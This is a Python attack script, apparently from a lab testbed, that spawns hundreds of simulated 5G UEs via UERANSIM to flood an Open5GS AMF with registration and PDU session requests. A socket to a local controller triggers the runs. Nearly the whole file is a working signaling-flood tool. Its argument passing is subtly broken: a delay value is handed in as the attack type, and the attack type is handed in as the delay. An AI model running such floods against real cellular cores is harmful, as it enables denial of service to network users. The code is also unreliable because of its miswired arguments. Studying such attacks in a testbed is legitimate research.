import yaml
from copy import deepcopy
import sys
import time
import subprocess
import os
import argparse
import multiprocessing
import socket

def create_copies(start_supi, attack_type, no_of_ue): 
    """
    This function creates copies for malicious UEs from the base config file
    """

    base_supi = 999700000000001
    key = int("465B5CE8B199B49FAA5F0A2EE238A6BC",16) + (start_supi - base_supi)

    path = "/home/vagrant/UERANSIM/config/"
    with open(path + 'open5gs-ue.yaml', 'r') as file:
        original_ue = yaml.safe_load(file)

    att_ue = start_supi
    new_ue = deepcopy(original_ue)

    # if the attack plans to only use PDU sessions, or the whole cycle 
    if attack_type == 2 :
        del new_ue['sessions']

	# defaulting to the 2nd gNB
    new_ue['gnbSearchList'] = ["192.168.56.121"]

    # print("Creating " + str(number_of_ues) +"UE config file for attack type: " + str(attack_type))
    
    file_paths_list = []
    for i in range(1, no_of_ue + 1):
        new_ue['supi'] = "imsi-"+ str(att_ue + i)
        new_ue['key'] = str(hex(key + i)).split('0x')[-1].upper()
        with open(path + 'm-open5gs-ue-'+ str(i) +'.yaml', 'w') as file:
            yaml.dump(new_ue, file)
            file_paths_list.append(path + 'm-open5gs-ue-'+ str(i) +'.yaml')

    return file_paths_list

def run_attack_one_or_two(path, delay_bw, repeat):
    """ This is teh implementation for the attack type one or two. We are running the UEs in a loop if repeat is enabled.
    """

    ue_number = ((path.split('/')[-1]).split('.')[0]).split('-')[-1]
    imsi = "imsi-" + str(999700000000000 + int(ue_number)+1)
    command = "/home/vagrant/UERANSIM/build/nr-ue -c " + path + "> .logs/" + imsi +  ".log &"
    
    if repeat == 1: 
        while 1:
            subprocess.run(command, shell=True, check=True)
            time.sleep(delay_bw)
            proc2 = subprocess.Popen("ps -ef | grep '/home/vagrant/UERANSIM/build/nr-ue -c "+ path+ "' | grep -v 'grep' | awk '{ printf $2 }'",shell=True,stdout=subprocess.PIPE)
            pids=""
            for c in iter(lambda:proc2.stdout.read(1),b""):
                pids+=c.decode('utf-8')
            subprocess.run(["kill","-9",pids])

    
    if repeat == 0: 
        subprocess.run(command, shell=True, check=True)
        time.sleep(delay_bw)
        return 1

if __name__ == "__main__": 
    """
    Attack Type 1 = Sends Registration and PDU session request
    Attack Type 2 = Sends Registration request only
    Attack Type 3 = Sends PDU session request only (Not implemented yet)
    """

    parser=argparse.ArgumentParser(description='''This is the script that will be used to attack the AMF.''',)
 
    parser.add_argument('-s','--start_imsi', type=int, default=999700000000302, help='This is the starting point for for ues-imsi' , required=True)
    parser.add_argument('-n','--number_of_ues', type=int, help='This variable takes in the number of UEs to be started' , required=True)
    parser.add_argument('-a','--attack_type', required=True,type=int, default=1, help='This variable can take 3 values.\n 1 for Registration + PDU session \n, 2 for Registration only\n 3 for PDU session only')
    parser.add_argument('-r','--repeat', type=int,default=0, help='This variable takes 1 or 0 based on if we want the UEs to be started and stopped in a loop or not', required=True)
    parser.add_argument('-t','--timeout', type=int,default=10, help='This variable takes in the timeout value for the attack', required=True)
    parser.add_argument('-p','--processes', type=int,default=0, help='This variable takes in the number of processes to be run in parallel (MAX 500)', required=True)
    parser.add_argument('-db','--delay_between', type=float,default=0.5, help='This variable takes in the delay between each UE', required=True)

    args = parser.parse_args()
    
    # The attack type is passed as an argument to the script
    attack_type = args.attack_type
    number_of_ues = args.number_of_ues
    repeat = args.repeat
    timeout = args.timeout
    proc_count = args.processes
    start_imsi = args.start_imsi
    delay_bw = args.delay_between

    # Currently supports only 1 or 2
    if attack_type != 1 and attack_type != 2 :
        print("Invalid attack type")
        exit(1)

    # if the number of processes not given 
    if proc_count == 0:
        proc_count = number_of_ues
    
    commands = create_copies(start_imsi, delay_bw, number_of_ues)
    
    if proc_count > 500: 
        proc_count = 500

    pool = multiprocessing.Pool(processes=proc_count)
    arguments = [(command, attack_type, repeat) for command in commands]

    ## Modeling a sophisticated attacker 
    s = socket.socket()
    # Define the port on which you want to connect
    addr = "192.168.56.131"
    port = 12345
    s.settimeout(2)

    # connect to the server on local computer
    s.connect((addr, port))
    
    x = s.recv(1024)
    while x:

        try: 
            results = pool.starmap_async(run_attack_one_or_two, arguments)
            # Wait for the specified timeout
            results.get(timeout=timeout)
        except multiprocessing.TimeoutError:
            # Timeout occurred, terminate the pool
            pool.terminate()
            pool.join()
            print("Program terminated after", timeout , "seconds.")
        else:
            pool.close()
            pool.join()
            print("Program completed successfully.")
        
        x = s.recv(1024)        

    # Cleaning up the files
    os.system("sudo rm -rf .logs/*")
    os.system("sudo rm -rf UERANSIM/config/m-open5gs-ue-*")
    os.system("sudo pkill nr-ue")
    s.close()